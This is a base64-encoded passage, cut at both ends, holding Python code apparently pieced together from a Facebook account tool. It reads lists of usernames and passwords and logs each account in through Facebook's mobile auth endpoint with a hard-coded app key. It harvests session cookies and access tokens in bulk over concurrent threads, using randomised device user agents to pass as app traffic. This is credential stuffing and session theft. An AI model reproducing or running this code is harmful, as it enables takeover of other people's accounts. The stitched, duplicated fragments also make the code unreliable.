RE0ve2RlbnNpdHk9My4wLHdpZHRoPTEwODAsaGVpZ2h0PTE5MjB9O0ZCX0ZXLzE7XSIsCiAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnLAogICAgICAgICdIb3N0JzogJ2dyYXBoLmZhY2Vib29rLmNvbScsCiAgICB9CiAgICByZXNwb25zZSA9IHB0KCJodHRwczovL2ItZ3JhcGguZmFjZWJvb2suY29tL2F1dGgvbG9naW4iLCBoZWFkZXJzPWhlYWRlcnMsIGRhdGE9ZGF0YSwgYWxsb3dfcmVkaXJlY3RzPUZhbHNlKQogICAgcmV0dXJuIHJlc3BvbnNlLmpzb24oKQoKZGVmIHJ1bmluZygpOgogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIGZpbGVfcGF0aCA9IGdldF9maWxlX3BhdGgoKQogICAgc3RvcmFnZV9wYXRoID0gZ2V0X2Nvb2tpZV9zdG9yYWdlX3BhdGgoKSAgIyBHZXQgcGF0aCBmb3Igc3RvcmluZyBjb29raWVzCiAgICBjcmVkZW50aWFscyA9IHJlYWRfY3JlZGVudGlhbHMoZmlsZV9wYXRoKQoKICAgIGlmIG5vdCBjcmVkZW50aWFsczoKICAgICAgICBwcmludChmIntSfU5vIGNyZWRlbnRpYWxzIGZvdW5kIGluIHRoZSBmaWxlLiIpCiAgICAgICAgcmV0dXJuCiAgICAgCiAgICBwcmludChmIiAgICAgIHtyZWR9Rk9VTkQge2xlbihjcmVkZW50aWFscyl9IHtncmVlbn1DUkVERU5USUFMUyAhLi4uIikKCiAgICBmb3IgdXNlciwgcGFzc3cgaW4gY3JlZGVudGlhbHM6CiAgICAgICAgcmVzcG9uc2UgPSBjdXNlcih1c2VyLCBwYXNzdykKCiAgICAgICAgaWYgInNlc3Npb25fa2V5IiBpbiByZXNwb25zZToKICAgICAgICAgICAgY2xlYXIoKQogICAgICAgICAgICBjb29raWVfc3RyID0gJzsgJy5qb2luKGYne2lbIm5hbWUiXX09e2lbInZhbHVlIl19JyBmb3IgaSBpbiByZXNwb25zZS5nZXQoJ3Nlc3Npb25fY29va2llcycsIFtdKSkKICAgICAgICAgICAgY2xlYXJfc2NyZWVuKCkKICAgICAgICAgICAgam92YW4oKQogICAgICAgICAgICBwcmludChmIiAgICAge3JlZH1DT09LSUUge3llbGxvd306IHt3aGl0ZX17Q317Y29va2llX3N0cn0iKQogICAgICAgICAgICAKICAgICAgICAgICAgd2l0aCBvcGVuKHN0b3JhZ2VfcGF0aCwgJ2EnKSBhcyBmOiAgIyBVc2UgdGhlIHVzZXItZGVmaW5lZCBwYXRoIGZvciBzdG9yaW5nIGNvb2tpZXMKICAgICAgICAgICAgICAgIGYud3JpdGUoY29va2llX3N0ciArICdcbicpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoZiJ7Un1JTlZBTElEL0NIRUNLUE9JTlQgZm9yIFVTRVIgSUQ6IHtDfXt1c2VyfSIpCgogICAgcHJpbnQoZiJ7R31Qcm9jZXNzaW5nIGNvbXBsZXRlLiBBbGwgY3JlZGVudGlhbHMgaGF2ZSBiZWVuIHByb2Nlc3NlZC4iKQoKIyBSdW4gbWFpbigpIG9ubHkgd2hlbiBzY3JpcHQgaXMgZXhlY3V0ZWQgZGlyZWN0bHkKZGVmIGJpdHooKToKICAgIGNsZWFyX3NjcmVlbigpCiAgICBqb3ZhbigpCiAgICBwcmludChmIiAgICAge3llbGxvd31bMV0ge2dyZWVufUdFVCBDT09LSUUiKQogICAgcHJpbnQoZiIgICAgIHt5ZWxsb3d9WzJdIHtncmVlbn1BVVRPIENSRUFURSBQQUdFIikKICAgIHByaW50KGYiICAgIHtyZWR94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBudW1fcmVhY3Rpb25zID0gaW50KGlucHV0KGYnICAgICB7cmVkfUVudGVyIE9wdGlvbjogJykpCgogICAgaWYgbnVtX3JlYWN0aW9ucyA9PSAxOgogICAgICAgIHJ1bmluZygpCiAgICBlbGlmIG51bV9yZWFjdGlvbnMgPT0gMjoKICAgICAgICBoYWNrZXpyKCkgIyBQbGFjZWhvbGRlciBmb3IgZnVydGhlciBpbXBsZW1lbnRhdGlvbgogICAgZWxzZToKICAgICAgICBwcmludChmIntSfUludmFsaWQgb3B0aW9uIHNlbGVjdGVkLiIpCmltcG9ydCByYW5kb20KaW1wb3J0IHJlcXVlc3RzCmZyb20gY29sb3JhbWEgaW1wb3J0IGluaXQsIEZvcmUsIFN0eWxlCmltcG9ydCBvcwoKIyBJbml0aWFsaXplIGNvbG9yYW1hCmluaXQoKQoKY2xhc3MgUmVnUHJvNToKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb29raWVzKSAtPiBOb25lOgogICAgICAgIHNlbGYuY29va2llcyA9IGNvb2tpZXMKICAgICAgICBzZWxmLmlkX2FjYyA9IHNlbGYuY29va2llcy5zcGxpdCgnY191c2VyPScpWzFdLnNwbGl0KCc7JylbMF0KICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAnYXV0aG9yaXR5JzogJ3d3dy5mYWNlYm9vay5jb20nLAogICAgICAgICAgICAnYWNjZXB0JzogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOScsCiAgICAgICAgICAgICdhY2NlcHQtbGFuZ3VhZ2UnOiAndmknLAogICAgICAgICAgICAnY29va2llJzogc2VsZi5jb29raWVzLAogICAgICAgICAgICAnc2VjLWNoLXByZWZlcnMtY29sb3Itc2NoZW1lJzogJ2xpZ2h0JywKICAgICAgICAgICAgJ3NlYy1jaC11YSc6ICciQ2hyb21pdW0iO3Y9IjEwNiIsICJHb29nbGUgQ2hyb21lIjt2PSIxMDYiLCAiTm90O0E9QnJhbmQiO3Y9Ijk5IicsCiAgICAgICAgICAgICdzZWMtY2gtdWEtbW9iaWxlJzogJz8wJywKICAgICAgICAgICAgJ3NlYy1jaC11YS1wbGF0Zm9ybSc6ICciV2luZG93cyInLAogICAgICAgICAgICAnc2VjLWZldGNoLWRlc3QnOiAnZG9jdW1lbnQnLAogICAgICAgICAgICAnc2VjLWZldGNoLW1vZGUnOiAnbmF2aWdhdGUnLAogICAgICAgICAgICAnc2VjLWZldGNoLXNpdGUnOiAnbm9uZScsCiAgICAgICAgICAgICdzZWMtZmV0Y2gtdXNlcic6ICc/MScsCiAgICAgICAgICAgICd1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzJzogJzEnLAogICAgICAgICAgICAndXNlci1hZ2VudCc6ICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTA2LjAuMC4wIFNhZmFyaS81MzcuMzYnLAogICAgICAgICAgICAndmlld3BvcnQtd2lkdGgnOiAnMTM2NicsCiAgICAgICAgfQogICAgICAgIAogICAgICAgIHVybF9wcm9maWxlID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3d3dy5mYWNlYm9vay5jb20vbWUnLCBoZWFkZXJzPWhlYWRlcnMpLnVybAogICAgICAgIHByb2ZpbGUgPSByZXF1ZXN0cy5nZXQodXJsX3Byb2ZpbGUsIGhlYWRlcnM9aGVhZGVycykudGV4dAoKICAgICAgICAjIEluaXRpYWxpemUgZmJfZHRzZyB0byBOb25lCiAgICAgICAgc2VsZi5mYl9kdHNnID0gTm9uZQogICAgICAgIAogICAgICAgICMgVHJ5IHRvIGZpbmQgZmJfZHRzZyB1c2luZyBtdWx0aXBsZSBwYXR0ZXJucwogICAgICAgIHBhdHRlcm5zID0gWwogICAgICAgICAgICAneyJuYW1lIjoiZmJfZHRzZyIsInZhbHVlIjoiJywgICMgUHJpbWFyeSBwYXR0ZXJuCiAgICAgICAgICAgICcsImYiOiInLCAgICAgICAgICAgICAgICAgICAgICAjIFNlY29uZGFyeSBwYXR0ZXJuCiAgICAgICAgICAgICMgQWRkIG1vcmUgcGF0dGVybnMgaWYgbmVjZXNzYXJ5CiAgICAgICAgXQoKICAgICAgICBmb3IgcGF0dGVybiBpbiBwYXR0ZXJuczoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgc2VsZi5mYl9kdHNnID0gcHJvZmlsZS5zcGxpdChwYXR0ZXJuKVsxXS5zcGxpdCgnIn0sJylbMF0KICAgICAgICAgICAgICAgIGJyZWFrICAjIEJyZWFrIGlmIHRoZSBwYXR0ZXJuIGlzIGZvdW5kCiAgICAgICAgICAgIGV4Y2VwdCBJbmRleEVycm9yOgogICAgICAgICAgICAgICAgY29udGludWUgICMgVHJ5IHRoZSBuZXh0IHBhdHRlcm4KCiAgICAgICAgaWYgbm90IHNlbGYuZmJfZHRzZzoKICAgICAgICAgICAga29sb3IoIkVycm9yOiBmYl9kdHNnIG5vdCBmb3VuZCBpbiBwcm9maWxlIGRhdGEuIiwgJ3JlZCcpCiAgICBpbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHRocmVhZGluZwpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yCmltcG9ydCByYW5kb20KaW1wb3J0IHRpbWUKaW1wb3J0IHN5cwppbXBvcnQgb3MKaW1wb3J0IHBsYXRmb3JtCiMgQ29sb3IgY29kZXMgZm9yIGZvcm1hdHRpbmcgb3V0cHV0CnB1cnBsZSA9ICJcMDMzWzE7MzVtIgpibHVlID0gIlwwMzNbMzRtIgpncmVlbiA9ICJcMDMzWzE7MzJtIgpyZWQgPSAiXDAzM1sxOzMxbSIKeWVsbG93ID0gIlwwMzNbMTszM20iCndoaXRlID0gIlwwMzNbMTszN20iCmltcG9ydCByYW5kb20KaW1wb3J0IHN0cmluZwpkZWYgY2xlYXJfc2NyZWVuKCk6CiAgICBpZiAndGVybXV4JyBpbiBwbGF0Zm9ybS5zeXN0ZW0oKS5sb3dlcigpOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgZWxpZiBwbGF0Zm9ybS5zeXN0ZW0oKS5sb3dlcigpID09ICd3aW5kb3dzJzoKICAgICAgICBvcy5zeXN0ZW0oJ2NscycpCiAgICBlbHNlOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQpkZWYgZ2VuZXJhdGVfdXNlcl9hZ2VudCgpOgogICAgZmJhdiA9IGYie3JhbmRvbS5yYW5kaW50KDExMSwgOTk5KX0uMC4wLntyYW5kb20ucmFuZGludCgxMSwgOTkpfS57cmFuZG9tLnJhbmRpbnQoMTExLCA5OTkpfSIKICAgIGZiYnYgPSBzdHIocmFuZG9tLnJhbmRpbnQoMTExMTExMTExLCA5OTk5OTk5OTkpKQogICAgZmJydiA9ICcwJwogICAgcmFuZG9tX3NlZWQgPSByYW5kb20uUmFuZG9tKCkKICAgIGFkaWQgPSAnJy5qb2luKHJhbmRvbV9zZWVkLmNob2ljZXMoc3RyaW5nLmhleGRpZ2l0cywgaz0xNikpCgogICAgIyBSYW5kb21seSB2YXJ5IHRoZSBBbmRyb2lkIE9TIHZlcnNpb24sIGRldmljZSwgYW5kIGFwcCB2ZXJzaW9uIGZvciByZWFsaXNtCiAgICBkZXZpY2UgPSByYW5kb20uY2hvaWNlKFsiSFVBV0VJIE1BUi1MWDFNIiwgIlNhbXN1bmcgU00tRzk2MEYiLCAiT25lUGx1cyBHTTE5MTMiXSkKICAgIGZiYXZfdmVyc2lvbiA9IHN0cihyYW5kb20ucmFuZGludCg0OSwgMTUwKSkgICMgVXBkYXRlZCByYW5nZSBmb3IgRkJBViB2ZXJzaW9ucwogICAgZmJidl92ZXJzaW9uID0gc3RyKHJhbmRvbS5yYW5kaW50KDExMTExMTExLCA3Nzc3Nzc3NykpCiAgICBjYXJyaWVyID0gcmFuZG9tLmNob2ljZShbIk9vcmVkb28gVE4iLCAiT3JhbmdlIiwgIlZvZGFmb25lIiwgIlQtTW9iaWxlIl0pCgogICAgdWFfYmdyYXBoID0gZidbRkJBTi9GQjRBO0ZCQVYve2ZiYXZfdmVyc2lvbn0uMC4wLntyYW5kb20ucmFuZHJhbmdlKDIwLCA0OSl9LntyYW5kb20ucmFuZGludCgxMSwgOTkpfTtGQkJWL3tmYmJ2X3ZlcnNpb259OycgXAogICAgICAgICAgICAgICAgZidbRkJBTi9GQjRBO0ZCQVYve2ZiYXZ9O0ZCQlYve2ZiYnZ9O0ZCRE0ve3tkZW5zaXR5PTMuMCx3aWR0aD0xMDgwLGhlaWdodD0yMTA3fX07RkJMQy9mcl9GUjsnIFwKICAgICAgICAgICAgICAgIGYnRkJSVi97ZmJydn07RkJDUi97Y2Fycmllcn07RkJNRi97ZGV2aWNlLnNwbGl0KCIgIilbMF19O0ZCQkQve2RldmljZS5zcGxpdCgiICIpWzBdfTsnIFwKICAgICAgICAgICAgICAgIGYnRkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCRFYve2RldmljZX07RkJTVi85O0ZCT1AvMTtGQkNBL2FybTY0LXY4YTpdJwogICAgCiAgICByZXR1cm4gdWFfYmdyYXBoCgp1YV9iZ3JhcGggPSBnZW5lcmF0ZV91c2VyX2FnZW50KCkKCgppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHJhbmRvbQppbXBvcnQgY29uY3VycmVudC5mdXR1cmVzIGFzIHRocmVhZAppbXBvcnQgb3MKaW1wb3J0IHN0cmluZwoKIyBSYW5kb20gRkIgdmVyc2lvbiBnZW5lcmF0aW9uCmZiYXYgPSBmJ3tyYW5kb20ucmFuZGludCgxMTEsIDk5OSl9LjAuMC57cmFuZG9tLnJhbmRpbnQoMTEsIDk5KX0ue3JhbmRvbS5yYW5kaW50KDExMSwgOTk5KX0nCmZiYnYgPSBzdHIocmFuZG9tLnJhbmRpbnQoMTExMTExMTExLCA5OTk5OTk5OTkpKQpmYnJ2ID0gJzAnCnJhbmRvbV9zZWVkID0gcmFuZG9tLlJhbmRvbSgpCmFkaWQgPSAnJy5qb2luKHJhbmRvbV9zZWVkLmNob2ljZXMoc3RyaW5nLmhleGRpZ2l0cywgaz0xNikpCgojIFVzZXIgYWdlbnQgc3RyaW5nCnVhX2JncmFwaCA9ICdbRkJBTi9GQjRBO0ZCQVYvJyArIHN0cihyYW5kb20ucmFuZGludCg0OSwgNjYpKSArICcuMC4wLicgKyBzdHIocmFuZG9tLnJhbmRyYW5nZSgyMCwgNDkpKSArIHN0cihyYW5kb20ucmFuZGludCgxMSwgOTkpKSArICc7RkJCVi8nICsgc3RyKHJhbmRvbS5yYW5kaW50KDExMTExMTExLCA3Nzc3Nzc3NykpICsgJzsnICsgJ1tGQkFOL0ZCNEE7RkJBVi8nICsgZmJhdiArICc7RkJCVi8nICsgZmJidiArICc7RkJETS97ZGVuc2l0eT0zLjAsd2lkdGg9MTA4MCxoZWlnaHQ9MjEwN307RkJMQy9mcl9GUjtGQlJWLycgKyBmYnJ2ICsgJztGQkNSL09vcmVkb28gVE47RkJNRi9IVUFXRUk7RkJCRC9IVUFXRUk7RkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCRFYvTUFSLUxYMU07RkJTVi85O0ZCT1AvMTtGQkNBL2FybTY0LXY4YTpdJwoKZGVmIGJncmFwaCh1aWQsIHB3LCBwYXRoX2ZpbGUsIGV4dHJhY3RfdHlwZSwgc3VjY2Vzc19jb3VudCwgZXhpc3RpbmdfdWlkcyk6CiAgICBhY2Nlc3NUb2tlbiA9ICczNTA2ODU1MzE3Mjh8NjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInICAjIEV4YW1wbGUgdG9rZW4KCiAgICBkYXRhID0gewogICAgICAgICdtZXRob2QnOiAnYXV0aC5sb2dpbicsCiAgICAgICAgJ2ZiX2FwaV9yZXFfZnJpZW5kbHlfbmFtZSc6ICdhdXRoZW50aWNhdGUnLAogICAgICAgICdmYl9hcGlfY2FsbGVyX2NsYXNzJzogJ2NvbS5mYWNlYm9vay5hY2NvdW50LmxvZ2luLnByb3RvY29sLkZiNGFBdXRoSGFuZGxlcicsCiAgICAgICAgJ2FwaV9rZXknOiAnNjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInLAogICAgICAgICdlbWFpbCc6IHVpZCwKICAgICAgICAncGFzc3dvcmQnOiBwdywKICAgICAgICAnYWNjZXNzX3Rva2VuJzogYWNjZXNzVG9rZW4KICAgIH0KCiAgICB1cmwgPSAnaHR0cHM6Ly9iLWdyYXBoLmZhY2Vib29rLmNvbS9hdXRoL2xvZ2luP2luY2x1ZGVfaGVhZGVycz1mYWxzZSZkZWNvZGVfYm9keV9qc29uPWZhbHNlJnN0cmVhbWFibGVfanNvbl9yZXNwb25zZT10cnVlJwoKICAgIHRyeToKICAgICAgICAKICAgICAgICBpZiB1aWQgaW4gZXhpc3RpbmdfdWlkczoKICAgICAgICAgICAgcHJpbnQoZiIgICAgIHt5ZWxsb3d9W0lORk9dIHtyZWR9QUNDT1VOVCAtLT4ge3doaXRlfXt1aWR9IHtyZWR9YWxyZWFkeSBleGlzdHMuIikKICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICAgICAgcmV0dXJuCgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9ZGF0YSkuanNvbigpCiAgICAgICAgCiAgICAgICAgcHJpbnQocmVzcG9uc2UpCiAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gcmVzcG9uc2U6CiAgICAgICAgICAgIHRva2VuID0gcmVzcG9uc2VbJ2FjY2Vzc190b2tlbiddCgogICAgICAgICAgICB3aXRoIG9wZW4ocGF0aF9maWxlLCAnYScpIGFzIGY6CiAgICAgICAgICAgICAgICBmLndyaXRlKGYie3VpZH18e3Rva2VufVxuIikKCiAgICAgICAgICAgIHByaW50KCJcMDMzWzE7Mzdt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgICAgIHByaW50KGYiICAgICBcMDMzWzMybVtTVUNDRVNTXVwwMzNbMG06IEV4dHJhY3RlZCBBY2NvdW50IOKUgOKUgOKUgOKUgOKUgD4ge3VpZH0uIikKICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICAgICAgc3VjY2Vzc19jb3VudC5hcHBlbmQodWlkKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KCJcMDMzWzE7Mzdt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgICAgIHByaW50KGYiICAgICBcMDMzWzMxbVtGQUlMRURdXDAzM1swbTogVE8gRVhUUkFDVCBBY2NvdW50IOKUgOKUgOKUgOKUgOKUgD4ge3VpZH0uIikKICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiIgICAgIFwwMzNbMTszMW1bRVJST1JdXDAzM1swbSBFcnJvciBleHRyYWN0aW5nIGFjY291bnQ6IHt1aWR9LiBSZWFzb246IHtzdHIoZSl9XDAzM1swbVxuIikKCgpkZWYgcHJveihhY2NvdW50c19maWxlLCB0b2tlbl9vdXRwdXRfcGF0aCwgZXh0cmFjdF90eXBlKToKICAgICIiIlByb2Nlc3MgdGhlIGFjY291bnRzIGFuZCBleHRyYWN0IHRva2VucyBjb25jdXJyZW50bHkuIiIiCiAgICBzdWNjZXNzX2NvdW50ID0gW10KCiAgICAjIExvYWQgZXhpc3RpbmcgdWlkcyBmcm9tIHRoZSBvdXRwdXQgZmlsZSB0byBhdm9pZCBkdXBsaWNhdGVzCiAgICBleGlzdGluZ191aWRzID0gc2V0KCkKICAgIGlmIG9zLnBhdGguZXhpc3RzKHRva2VuX291dHB1dF9wYXRoKToKICAgICAgICB3aXRoIG9wZW4odG9rZW5fb3V0cHV0X3BhdGgsICdyJykgYXMgZjoKICAgICAgICAgICAgZXhpc3RpbmdfdWlkcyA9IHtsaW5lLnNwbGl0KCd8JylbMF0gZm9yIGxpbmUgaW4gZi5yZWFkbGluZXMoKX0KCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGFjY291bnRzX2ZpbGUsICdyJykgYXMgZmlsZToKICAgICAgICAgICAgYWNjb3VudHMgPSBmaWxlLnJlYWRsaW5lcygpCgogICAgICAgIGFjY291bnRzID0gW2xpbmUuc3RyaXAoKSBmb3IgbGluZSBpbiBhY2NvdW50cyBpZiAnfCcgaW4gbGluZS5zdHJpcCgpXQoKICAgICAgICBpZiBub3QgYWNjb3VudHM6CiAgICAgICAgICAgIHByaW50KGYiTm8gdmFsaWQgYWNjb3VudHMgZm91bmQgaW4ge2FjY291bnRzX2ZpbGV9LiIpCiAgICAgICAgICAgIHJldHVybgoKICAgICAgICB3aXRoIHRocmVhZC5UaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGV4ZWN1dG9yOgogICAgICAgICAgICBmdXR1cmVzID0gW2V4ZWN1dG9yLnN1Ym1pdChiZ3JhcGgsIHVpZCwgcHcsIHRva2VuX291dHB1dF9wYXRoLCBleHRyYWN0X3R5cGUsIHN1Y2Nlc3NfY291bnQsIGV4aXN0aW5nX3VpZHMpCiAgICAgICAgICAgICAgICAgICAgICAgZm9yIHVpZCwgcHcgaW4gW2FjY291bnQuc3BsaXQoJ3wnKSBmb3IgYWNjb3VudCBpbiBhY2NvdW50c11dCgogICAgICAgICAgICBmb3IgZnV0dXJlIGluIGZ1dHVyZXM6CiAgICAgICAgICAgICAgICBmdXR1cmUucmVzdWx0KCkKCiAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICBwcmludChmIiAgICAgXDAzM1sxOzM0bVtTVUNDRVNTXVwwMzNbMG06IHtsZW4oc3VjY2Vzc19jb3VudCl9IHtleHRyYWN0X3R5cGV9KHMpIHN1Y2Nlc3NmdWxseSBleHRyYWN0ZWQuIikKICAgICAgICBwcmludCgiXDAzM1sxOzM3beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQoKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICBwcmludChmIkZpbGUgbm90IGZvdW5kOiB7YWNjb3VudHNfZmlsZX0iKQogICAgICAgIHJldHVybgoKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCByYW5kb20KaW1wb3J0IGNvbmN1cnJlbnQuZnV0dXJlcyBhcyB0aHJlYWQKaW1wb3J0IG9zCmltcG9ydCBzdHJpbmcKCmZiYXYgPSBmJycne3JhbmRvbS5yYW5kaW50KDExMSwgOTk5KX0uMC4wLntyYW5kb20ucmFuZGludCgxMSwgOTkpfS57cmFuZG9tLnJhbmRpbnQoMTExLCA5OTkpfScnJwpmYmJ2ID0gc3RyKHJhbmRvbS5yYW5kaW50KDExMTExMTExMSwgOTk5OTk5OTk5KSkKZmJydiA9ICcwJwpyYW5kb21fc2VlZCA9IHJhbmRvbS5SYW5kb20oKQphZGlkID0gJycuam9pbihyYW5kb21fc2VlZC5jaG9pY2VzKHN0cmluZy5oZXhkaWdpdHMsIGs9MTYpKQp1YV9iZ3JhcGggPSAnW0ZCQU4vRkI0QTtGQkFWLycgKyBzdHIocmFuZG9tLnJhbmRpbnQoNDksIDY2KSkgKyAnLjAuMC4nICsgc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMjAsIDQ5KSkgKyBzdHIocmFuZG9tLnJhbmRpbnQoMTEsIDk5KSkgKyAnO0ZCQlYvJyArIHN0cihyYW5kb20ucmFuZGludCgxMTExMTExMSwgNzc3Nzc3NzcpKSArICc7JyArICdbRkJBTi9GQjRBO0ZCQVYvJyArIGZiYXYgKyAnO0ZCQlYvJyArIGZiYnYgKyAnO0ZCRE0ve2RlbnNpdHk9My4wLHdpZHRoPTEwODAsaGVpZ2h0PTIxMDd9O0ZCTEMvZnJfRlI7RkJSVi8nICsgZmJydiArICc7RkJDUi9Pb3JlZG9vIFROO0ZCTUYvSFVBV0VJO0ZCQkQvSFVBV0VJO0ZCUE4vY29tLmZhY2Vib29rLmthdGFuYTtGQkRWL01BUi1MWDFNO0ZCU1YvOTtGQk9QLzE7RkJDQS9hcm02NC12OGE6XScKCmRlZiBsb2FkX2V4aXN0aW5nX3Rva2VucyhwYXRoX2ZpbGUpOgogICAgIiIiTG9hZCBleGlzdGluZyBhY2NvdW50cyBvciBwYWdlcyBmcm9tIHRoZSBvdXRwdXQgZmlsZS4iIiIKICAgIGlmIG9zLnBhdGguZXhpc3RzKHBhdGhfZmlsZSk6CiAgICAgICAgd2l0aCBvcGVuKHBhdGhfZmlsZSwgJ3InKSBhcyBmOgogICAgICAgICAgICByZXR1cm4ge2xpbmUuc3BsaXQoJ3wnKVswXSBmb3IgbGluZSBpbiBmLnJlYWRsaW5lcygpfSAgIyBTZXQgb2YgZXhpc3RpbmcgdWlkcyBvciBwYWdlIGlkcwogICAgcmV0dXJuIHNldCgpCgpkZWYgYmdyYXBoX3BhZ2UodWlkLCBwdywgcGF0aF9maWxlLCBleHRyYWN0X3R5cGUsIHN1Y2Nlc3NfY291bnQsIGV4aXN0aW5nX3Rva2Vucyk6CiAgICBhY2Nlc3NUb2tlbiA9ICczNTA2ODU1MzE3Mjh8NjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInICAjIEV4YW1wbGUgdG9rZW4KICAgIAogICAgaWYgdWlkIGluIGV4aXN0aW5nX3Rva2VuczoKICAgICAgICBwcmludCgiXDAzM1sxOzM3beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOK